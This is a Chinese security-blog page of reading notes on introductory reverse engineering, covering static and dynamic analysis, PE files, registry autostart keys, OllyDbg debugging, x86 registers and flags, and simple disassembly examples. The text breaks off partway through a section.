<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
    <title>有趣的二进制读书笔记 | MottoIN</title>
    <link rel='dns-prefetch' href='//www.mottoin.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; 有趣的二进制读书笔记评论Feed" href="http://www.mottoin.com/99834.html/feed" />
<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
<style id='wpcom-qa-inline-css' type='text/css'>

        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}
        .q-content .q-answer .as-submit .btn-submit:hover,.q-content .q-answer .as-comments-submit:hover,.q-content .q-add-header .btn-post:hover,.q-content .topic-tab.current-tab:hover,.q-content .q-pagination a:hover{background-color:#0D62B3;}
        .q-content .q-answer .as-comments-input:focus{border-color: #1471CA;}
        
</style>
<link rel='stylesheet' id='um_minified-css'  href='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/css/um.min.css?ver=10.3.88' type='text/css' media='all' />
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/jquery.min.js?ver=1.12.4'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mottoin.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mottoin.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Windows内核本地拒绝服务＃4(Windows 8-10)' href='http://www.mottoin.com/99817.html' />
<link rel='next' title='瑞星提醒：短信拦截马病毒近期活跃并大肆偷取用户钱财' href='http://www.mottoin.com/99933.html' />
<link rel='shortlink' href='http://www.mottoin.com/?p=99834' />
<!--  WPCOM主题相关信息开始 -->
<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform">
<meta name="keywords" content="Jirairya,二进制,二进制入门,二进制学习笔记,二进制安全,二进制漏洞">
<meta name="description" content="通过逆向学习汇编代码软件分析文件的创建、修改、删除注册表项目的创建、修改和删除网络通信hex比较文件内容：Windos程序在重启的时候，可以把自动运行的程序注册在以下注册表中：HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunHKEY_CURRENT_USER\Software\Microsoft\Windows\Cur">
<!--  WPCOM主题相关信息结束 -->
 
		<script type="text/javascript">

		var ultimatemember_image_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php';
		var ultimatemember_file_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-file-upload.php';
		var ultimatemember_ajax_url = 'http://www.mottoin.com/wp-admin/admin-ajax.php';

		</script>

	
		<style type="text/css">.request_name { display: none !important; }</style>

	<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-32x32.jpg" sizes="32x32" />
<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-192x192.jpg" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-180x180.jpg" />
<meta name="msapplication-TileImage" content="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-270x270.jpg" />
    <style>
                a,.sec-panel-head span,.list.tabs .tab.active a,.header .nav>li.active>a,.header .dropdown-menu>.active>a,.entry .entry-info .nickname,.entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.comment-body .nickname,.form-submit-text span,.widget_profile .author-title,.um .um-profile-body .um-item-meta a,.login-modal-body .btn-register{color: #08c;}
        .header .dropdown-menu>li>a:hover,.header .dropdown-menu>.active>a:hover,.header .dropdown-menu>.active>a:focus,.navbar-action .publish,.pagination .current,.flex-control-paging li a.flex-active,.form-submit .submit,.sidebar .widget_nav_menu ul li.current-menu-item a,.sidebar .widget_nav_menu ul li.current-post-parent a,.search-form input.submit,.action .contact-title,.pf-submit,.tagHandler ul.tagHandlerContainer li.tagItem,.login-modal-body .btn-login,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce a.button.alt,.woocommerce button.button.alt,.woocommerce input.button.alt,.woocommerce a.button.alt.disabled,.woocommerce a.button.alt.disabled:hover,.woocommerce a.button.alt:disabled,.woocommerce a.button.alt:disabled:hover,.woocommerce a.button.alt:disabled[disabled],.woocommerce a.button.alt:disabled[disabled]:hover,.woocommerce button.button.alt.disabled,.woocommerce button.button.alt.disabled:hover,.woocommerce button.button.alt:disabled,.woocommerce button.button.alt:disabled:hover,.woocommerce button.button.alt:disabled[disabled],.woocommerce button.button.alt:disabled[disabled]:hover,.woocommerce input.button.alt.disabled,.woocommerce input.button.alt.disabled:hover,.woocommerce input.button.alt:disabled,.woocommerce input.button.alt:disabled:hover,.woocommerce input.button.alt:disabled[disabled],.woocommerce input.button.alt:disabled[disabled]:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,.woocommerce .widget_price_filter .ui-slider .ui-slider-range,.shopping-count,.social-login-form .sl-input-submit{background-color: #08c;}
        .entry .entry-content h3,.entry .entry-content .h3,.widget-title{border-left-color: #08c;}
        .entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.search-form input.keyword:focus,.widget_profile .author-title,.login-modal-body .btn-login,.login-modal-body .btn-register{border-color: #08c;}
        .entry-bar-inner .author-title:before,.widget_profile .author-title:before{border-right-color: #08c;}
        .list.tabs .tab.active a{border-bottom-color: #08c;}

        a:hover,.header .nav>li>a:hover,.header .nav>li.active>a,.navbar-action .login:hover,.navbar-action .login:focus,.navbar-action .profile a:hover,.navbar-search-icon:hover,.navbar-search-icon:focus,.entry .entry-info a:hover,.entry .entry-info a:focus,.entry-bar .info-item a:hover,.p-item-wrap:hover .title a,.special-item-title a:hover,.special-item-bottom a:hover,.widget ul a:hover,.widget ol a:hover,.sec-panel-head .more:hover,.topic-list .topic-wrap:hover span,.tabs .tab a:hover,
        .article-list .item-title a:hover,.article-list .item-meta a:hover,.article-list .item-meta a:focus,.list-links a:hover,.list-links a:focus,.um .um-profile-body .um-item-meta a:hover,.um .um-profile-body .um-item-link a:hover,.load-more:hover,.login-modal-body .btn-register:hover{color: #07c;}
        .navbar-action .publish:hover,.navbar-action .publish:focus,.entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.pagination a:hover,.flex-control-paging li a:hover,.form-submit .submit:hover,.widget .tagcloud a:hover,.sidebar .widget_nav_menu ul li.current-menu-item .sub-menu a:hover,.sidebar .widget_nav_menu ul li.current-post-parent .sub-menu a:hover,.sidebar .widget_nav_menu ul li a:hover,.search-form input.submit:hover,.action .a-box:hover,.footer-sns .fa:after,.article-list .item-category:hover,.pf-submit:hover,.tagHandler ul.tagHandlerContainer li.tagItem:hover,.login-modal-body .btn-login:hover,.woocommerce a.button:hover,.woocommerce button.button:hover,.woocommerce input.button:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.social-login-form .sl-input-submit:hover{background-color: #07c;}
        .entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.widget .tagcloud a:hover,.load-more:hover,.login-modal-body .btn-login:hover,.login-modal-body .btn-register:hover{border-color: #07c;}
        .special-item-bottom a:hover:before{border-left-color: #07c;}
        .list.tabs .tab.active a:hover{border-bottom-color: #07c;}
        @media (max-width: 991px){
            .header .navbar-nav>li.active>a,.header .navbar-nav .dropdown-menu .active a,.header .navbar-nav .dropdown-menu .active .dropdown-menu .active a{color: #08c;}
            .navbar-collapse{background-color: #08c;}
            .dropdown-menu>li a{border-color: #07c;}
            .header .navbar-nav>li.active>a:hover,.header .navbar-nav>li a:hover,.header .navbar-nav .dropdown-menu .active a:hover,.header .navbar-nav .dropdown-menu .active .dropdown-menu a:hover,.header .navbar-nav .dropdown-menu li a:hover{color: #07c;}
        }
        .j-share{position: fixed!important;top: 50%!important;}
                .header .logo img{max-height: 32px;}
                @media (max-width: 767px){
            .header .logo img{max-height: 26px;}
        }
                        .btn-post{
    display: block;
    margin: 0 auto;
    padding: 15px 20px;
    font-size: 16px;
    text-align: center;
    color: #fff !important;
    line-height: 1;
    background: #1471CA;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    text-decoration: none;
    border: 0;
    outline: 0;
}    </style>
    <script> (function() {if (!/*@cc_on!@*/0) return;var e = "abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video".split(', ');var i= e.length; while (i--){ document.createElement(e[i]) } })()</script>
    <!--[if lte IE 8]><script src="http://www.mottoin.com/wp-content/themes/JustNews/js/respond.min.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-99834 single-format-standard">
<header class="header">
    <div class="container clearfix">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="icon-bar icon-bar-1"></span>
                <span class="icon-bar icon-bar-2"></span>
                <span class="icon-bar icon-bar-3"></span>
            </button>
            <a class="logo" href="http://www.mottoin.com"><img src="http://www.mottoin.com/img/mottoin/logo.png" alt="MottoIN"></a>
        </div>
        <div class="collapse navbar-collapse">
            <nav class="navbar-left primary-menu"><ul id="menu-%e5%af%bc%e8%88%aa" class="nav navbar-nav"><li class="menu-item menu-item-home"><a href="http://www.mottoin.com/">首页</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/news">资讯</a></li>
<li class="menu-item current-post-ancestor dropdown"><a href="http://www.mottoin.com/category/article" class="dropdown-toggle">文章</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/web">Web安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/system">系统安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/network">网络安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/terminal">终端安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/database">数据安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/wireless">无线安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/social">社会工程</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/intranet">内网渗透</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/code">代码审计</a></li>
	<li class="menu-item current-post-ancestor current-menu-parent current-post-parent"><a href="http://www.mottoin.com/category/article/reverse">逆向破解</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/tools">工具</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/geek">极客</a></li>
<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/sole" class="dropdown-toggle">独家</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/topic">专题</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/people">人物</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/view">观点</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/events">活动</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/video">视频</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/hr">招聘</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/forum">社区</a></li>
</ul></nav>            <div class="navbar-action pull-right">

                                    <form class="navbar-search" action="http://www.mottoin.com" method="get" role="search">
                        <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value="">
                        <a class="navbar-search-icon j-navbar-search" href="javascript:;"></a>
                    </form>

                    
                    <div id="j-user-wrap">
                        <a class="login" href="http://www.mottoin.com/login">登录</a>
                        <a class="login" href="http://www.mottoin.com/register">注册</a>
                    </div>
                    <a class="publish" href="http://www.mottoin.com/post">
                        投稿</a>
                                                </div>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
</header>
<div id="wrap">    <div class="main container">
        <div class="content">
                            <article id="post-99834" class="post-99834 post type-post status-publish format-standard has-post-thumbnail hentry category-reverse tag-jirairya tag-3158 tag-3157 tag-3159 tag-3162 tag-3161">
                    <div class="entry">
                        <div class="entry-head">
                            <h1 class="entry-title">有趣的二进制读书笔记</h1>
                            <div class="entry-info">
                                                                <a class="nickname" href="http://www.mottoin.com/user/jirairya/">Jirairya</a>
                                <span class="dot">•</span>
                                <span>2017年4月6日</span>
                                <span class="dot">•</span>
                                <a href="http://www.mottoin.com/category/article/reverse" rel="category tag">逆向破解</a>                                                                    <span class="dot">•</span>
                                    <span>阅读 1762</span>
                                                            </div>
                        </div>
                                                                        <div class="entry-content clearfix">
                            <h2 class="md-end-block md-heading">通过逆向学习汇编代码</h2>
<h3 class="md-end-block md-heading">软件分析</h3>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">文件的创建、修改、删除</span></li>
<li><span class="md-line md-end-block">注册表项目的创建、修改和删除</span></li>
<li><span class="md-line md-end-block">网络通信 </span></li>
</ul>
<p><span class="md-line md-end-block">hex比较文件内容：</span></p>
<p><img class="alignnone size-full wp-image-99835 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1476837859289.png" alt=".1476837859289" width="486" height="323" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1476837859289.png 486w, http://www.mottoin.com/wp-content/uploads/2017/04/1476837859289-300x199.png 300w" sizes="(max-width: 486px) 100vw, 486px" /></p>
<p><span class="md-line md-end-block"> Windos程序在重启的时候，可以把自动运行的程序注册在以下注册表中：</span></p>
<pre>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</pre>
<p><span class="md-line md-end-block">sample.exe执行了：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">修改注册表以便系统重启的时候自动运行</span></li>
<li><span class="md-line md-end-block">将自己复制到“启动”文件夹以便在系统启动时自动运行 </span></li>
</ul>
<h3 class="md-end-block md-heading"><span class="">尝试静态分析</span></h3>
<p><span class="md-line md-end-block">软件分析，从方法可以分为“静态方法”和“动态方法”，它们的区别如下：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">静态分析：在不运行目标的情况下分析</span>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">阅读反汇编代码</span></li>
<li><span class="md-line md-end-block">提取可执行文件中的字符串，分析使用了哪些单词 </span></li>
</ul>
</li>
</ul>
<blockquote><p><span class="md-line md-end-block">从广义上来看，使用二进制编辑器查看可执行文件的内容也是静态分析</span></p></blockquote>
<p><span class="md-line md-end-block"><span class=""><strong>PE文件：</strong></span></span><span class="md-line md-end-block">PE就是Portable Executable（可移植可执行），它是Win32可执行文件的标准格式。PE文件是跨Win32平台的，即使Windows运行在非Intel的CPU上，任何Win32平台的PE装载器都能识别和使用该文件格式但移植到不同的CPU上会PE文件执行文件必然会改变。所有Win32执行体（除了VxD和16位的Dll）都使用PE文件，包括NT内核模式的驱动程序。</span></p>
<p><span class="md-line md-end-block">Win32病毒运行：</span></p>
<blockquote><p><span class="md-line md-end-block">有些在HOST运行过程中调用病毒代码</span></p></blockquote>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">用户点击（或者系统自动运行）HOST程序</span></li>
<li><span class="md-line md-end-block">装载HOST程序到内存</span></li>
<li><span class="md-line md-end-block">通过PE文件中的AddressOfEntryPoint和ImageBase之和来定位第一条语句的位置</span></li>
<li><span class="md-line md-end-block">从第一条语句开始执行（此时执行的就是病毒代码）</span></li>
<li><span class="md-line md-end-block">病毒主体代码执行完毕，将控制权交给HOST程序原来入口代码</span></li>
<li><span class="md-line md-end-block">HOST程序继续执行</span></li>
</ul>
<p><img class="alignnone size-full wp-image-99839 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1477316082696-1.png" alt=".1477316082696" width="860" height="470" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1477316082696-1.png 860w, http://www.mottoin.com/wp-content/uploads/2017/04/1477316082696-1-300x164.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1477316082696-1-768x420.png 768w" sizes="(max-width: 860px) 100vw, 860px" /></p>
<p><img class="alignnone size-full wp-image-99837 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1477316142493.png" alt=".1477316142493" width="1018" height="752" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1477316142493.png 1018w, http://www.mottoin.com/wp-content/uploads/2017/04/1477316142493-300x222.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1477316142493-768x567.png 768w" sizes="(max-width: 1018px) 100vw, 1018px" /> <img class="alignnone size-full wp-image-99837 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1477316142493.png" alt=".1477316142493" width="1018" height="752" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1477316142493.png 1018w, http://www.mottoin.com/wp-content/uploads/2017/04/1477316142493-300x222.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1477316142493-768x567.png 768w" sizes="(max-width: 1018px) 100vw, 1018px" /></p>
<h3 class="md-end-block md-heading">动态分析</h3>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">用调试器跟踪程序逻辑</span></li>
<li><span class="md-line md-end-block">获取文件和注册表访问日志</span></li>
<li><span class="md-line md-end-block">获取网络包</span></li>
</ul>
<p><img class="alignnone size-full wp-image-99840 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1477318942832.png" alt=".1477318942832" width="521" height="307" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1477318942832.png 521w, http://www.mottoin.com/wp-content/uploads/2017/04/1477318942832-300x177.png 300w" sizes="(max-width: 521px) 100vw, 521px" /></p>
<blockquote><p><span class="md-line md-end-block">&#8220;当进程名称为wsample01b.exe时输出日志&#8221;</span></p></blockquote>
<p><span class="md-line md-end-block"><span class=""><strong>调试器</strong></span>：发现程序问题和bug的软件，一般具有以下功能：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">断点</span></li>
<li><span class="md-line md-end-block">单步跳入、跳出</span></li>
<li><span class="md-line md-end-block">查看寄存器和内存数据</span></li>
</ul>
<p><span class="md-line md-end-block">断点是能够让程序在任意位置中断、恢复运行的功能。可以在可能会发生bug的地方稍微往前一点设置一个断点，以便找到导致问题的程序逻辑。一般来说，如果是机器语言，则以指令为单位来设置断点；如果是高级语言，则以源代码的行为单位来设置断点。断点能够在任意位置中断和恢复运行，而每执行一条指令都中断一次叫做单步跳入或跳出。通过单步运行的功能，我们可以以一条指令或一行代码为单位逐个运行程序的逻辑，仔细确认内存和变量的状态。跳入跳出的区别：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block"><span class=""><strong>跳入：调用函数时进入函数内部</strong></span></span></li>
<li><span class="md-line md-end-block"><span class=""><strong>跳出：调用函数时不进入函数内部，而是将函数调用作为一条指令来执行</strong></span></span><span class="md-line md-end-block">最后就是查看寄存器和内存数据了，这个功能可以再程序中断运行的状态下确认寄存器、内存和变量的状态。<br />
</span><span class="md-line md-end-block"><br />
<img class="alignnone size-full wp-image-99841 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1478437148946.png" alt=".1478437148946" width="1118" height="649" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1478437148946.png 1118w, http://www.mottoin.com/wp-content/uploads/2017/04/1478437148946-300x174.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1478437148946-768x446.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1478437148946-1024x594.png 1024w" sizes="(max-width: 1118px) 100vw, 1118px" /></span></li>
</ul>
<p><span class="md-line md-end-block">F2下断点，F7单步跳入，F8单步跳出。</span></p>
<p><span class="md-line md-end-block"> 寄存器是位于CPU的内部存储空间，都有自己的名字：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">EAX，&#8221;累加器&#8221;(accumulator)，扩展累加寄存器，在乘法和除法中被自动使用</span></li>
<li><span class="md-line md-end-block">EBX，&#8221;基地址&#8221;(base)寄存器, 在内存寻址时存放基地址。</span></li>
<li><span class="md-line md-end-block">ECX，计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。</span></li>
<li><span class="md-line md-end-block">EDX，则总是被用来放整数除法产生的余数。</span></li>
<li><span class="md-line md-end-block">ESP，扩展堆栈指针寄存器，寻址堆栈，极少用于普通的算术运算和数据传送。</span></li>
<li><span class="md-line md-end-block">ESI和EDI由高速内存数据传送指令使用，通常称为扩展源指针和扩展目的指针寄存器。</span></li>
<li><span class="md-line md-end-block">EBP，扩展帧指针寄存器，高级语言使用EBP引用堆栈上的函数参数和局部变量。</span></li>
<li><span class="md-line md-end-block">EIP，指令指针，存放下一条要执行的指令的地址。（指向当前执行的指令）有些程序可以修改EIP，使程序分支转移到新的地址执行。</span></li>
</ul>
<p><img class="alignnone size-full wp-image-99842 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1478442124536.png" alt=".1478442124536" width="301" height="320" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1478442124536.png 301w, http://www.mottoin.com/wp-content/uploads/2017/04/1478442124536-282x300.png 282w" sizes="(max-width: 301px) 100vw, 301px" /></p>
<p><span class="md-line md-end-block">在EIP下有C、P、A、Z、S、T、D、O几个字母，它们表示标志。一般会在这些字母后加上F（FLAG），CF、PF、AF、ZF，这些标志表示用于条件分支，如：</span></p>
<ul class="ul-list" data-mark="+">
<li><span class="md-line md-end-block">若ZF为1表示跳转</span></li>
<li><span class="md-line md-end-block">若CF位1表示不跳转</span></li>
</ul>
<blockquote><p><span class="md-line md-end-block">EFLAGS 寄存器由控制CPU的操作或反映CPU某些运算的结果的独立二进制位构成。当某标志等于1时就说其被置位；等于0时候就说其被清除（或复位）</span></p>
<p><span class="md-line md-end-block">控制标志，控制CPU的操作。例如，某些标志位可以使CPU在每条指令执行后、检测到算术运算溢出后、进入虚拟8086模式或保护模式后中断。</span></p>
<p><span class="md-line md-end-block">状态标志，反映CPU执行的算术和逻辑运算的结果，包括溢出标志、符号标志、零标志、辅助进位标志、奇偶标志、进位标志：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">进位标志(CF):在无符号算术的运算结果太大而目的操作数无法容纳时置位</span></li>
<li><span class="md-line md-end-block">溢出标志(OF):在有符号算术运算结果太大或太小而无目的操作数无法容纳时置位</span></li>
<li><span class="md-line md-end-block">符号标志(SF):在算术或逻辑运算的结果位负时置位。</span></li>
<li><span class="md-line md-end-block">零标志(ZF):在算术或逻辑运算结果为零时置位。</span></li>
<li><span class="md-line md-end-block">辅助进位标志(AC):在算术运算导致8位操作数的位3到位4产生进位时置位。</span></li>
<li><span class="md-line md-end-block">奇偶标志(PF):结果最低有效字节为1的位的数目位偶数时置位，否则PF复位。通常用于在数据有可能改变或丢失的情况下检查错误。</span></li>
</ul>
</blockquote>
<p><span class="md-line md-end-block">静态分析和动态分析的区别是在于“是否运行程序”，静态偏向于“纵览全局”，动态分析偏向于“细看局部”。在软件分析的时候，首先用二进制编辑器和IDA看全局，然后再用OllyDbug看局部。</span></p>
<blockquote><p><span class="md-line md-end-block">OD对python亲和性高，WinDbg对堆内核领域的程序进行调试，分析rootkit还是离不开它。</span></p></blockquote>
<h3 class="md-end-block md-heading">汇编指令</h3>
<p><img class="alignnone size-full wp-image-99843 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1478526772119.png" alt=".1478526772119" width="447" height="491" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1478526772119.png 447w, http://www.mottoin.com/wp-content/uploads/2017/04/1478526772119-273x300.png 273w" sizes="(max-width: 447px) 100vw, 447px" /></p>
<h3 class="md-end-block md-heading">汇编语言的条件分支</h3>
<p><span class="md-line md-end-block">汇编语言通过控制标志的cmp、test指令，以及根据标志完成分支的跳转类指令来实现。<br />
</span></p>
<p><img class="alignnone size-full wp-image-99845 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488938985975-1.png" alt=".1488938985975" width="1400" height="658" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488938985975-1.png 1400w, http://www.mottoin.com/wp-content/uploads/2017/04/1488938985975-1-300x141.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1488938985975-1-768x361.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1488938985975-1-1024x481.png 1024w" sizes="(max-width: 1400px) 100vw, 1400px" /></p>
<blockquote><p><span class="md-line md-end-block"><span spellcheck="false"><code>test eax eax</code></span>，当eax为0时将ZF置为1.只要看到带有两个相同寄存器的test指令，一般就是条件分支，可以理解为“若寄存器值为0，则将ZF置为1”</span><span class="md-line md-end-block">jnz指令的意思是，当ZF不为0时跳转。因此，将jnz和test指令结合起来就实现了</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">若eax为0则不跳转</span></li>
<li><span class="md-line md-end-block">若eax为1则跳转</span></li>
</ul>
<p><span class="md-line md-end-block">eax为0040100c的call lstrcmpW的返回值</span></p></blockquote>
<p><span class="md-line md-end-block">当ZF为1时程序不会进行跳转，而是继续执行0040101D的指令，从而显示&#8221;Hello!2012&#8243;这条消息。</span></p>
<h3 class="md-end-block md-heading">参数放在栈中</h3>
<p><span class="md-line md-end-block">参数通过栈来传递。</span></p>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>call</code></span><span class="">指令用来调用子程序，返回值放在eax中。传递给子程序的参数通过</span><span spellcheck="false"><code>push</code></span>放在栈中。</span></p>
<p><span class="md-line md-end-block">C语言中的函数调用：</span></p>
<pre>function(1,2,3)</pre>
<p><span class="md-line md-end-block">汇编语言中的函数调用：</span></p>
<pre>push 3
push 2
push 1
call function</pre>
<blockquote><p><span class="md-line md-end-block">参数是从后往前入栈。但也会因为CPU和编译器的不同有所变化。</span></p></blockquote>
<p><span class="md-line md-end-block">例如00401006位置上代码如下：</span></p>
<pre>00401006 push offet String2 ; "2012"
0040100B push eax ; lpString1
0040100C call ds:__imp__lstrcmpW@8 ;lstrcmpW(X,X)</pre>
<p><span class="md-line md-end-block">由于参数入栈顺序，可改成<span spellcheck="false"><code>eax=lstrcmpW(eax,"2012")</code></span>。<span spellcheck="false"><code>lstrcmpW</code></span>函数的功能是，当参数中的两个字符串相同时，则返回0，否则返回非0.</span></p>
<h3 class="md-end-block md-heading">通过汇编指令观察程序行为</h3>
<p><span class="md-line md-end-block">使用OD打开样本程序，然后在反汇编窗口中，右键选择Search for -&gt;Name in all modules</span></p>
<p><span class="md-line md-end-block"><img class="alignnone size-full wp-image-99846 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488943666940.png" alt=".1488943666940" width="1099" height="783" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488943666940.png 1099w, http://www.mottoin.com/wp-content/uploads/2017/04/1488943666940-300x214.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1488943666940-768x547.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1488943666940-1024x730.png 1024w" sizes="(max-width: 1099px) 100vw, 1099px" /></span></p>
<p><span class="md-line md-end-block">从显示的的函数列表中，找到类型为Export的<span spellcheck="false"><code>RegSetValueExa</code></span>函数：</span></p>
